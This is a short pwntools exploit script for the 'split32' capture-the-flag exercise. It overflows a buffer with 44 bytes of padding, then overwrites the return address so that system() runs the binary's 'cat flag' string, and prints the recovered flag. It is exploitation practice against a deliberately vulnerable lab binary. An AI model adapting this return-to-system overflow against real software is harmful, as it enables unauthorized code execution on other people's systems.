from pwn import *

system = 0x0804861a
cat_flag = 0x0804a030

payload = b"".join([
    b"A"*(32+12),
    p32(system),
    p32(cat_flag),
])

p = process("./split32")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
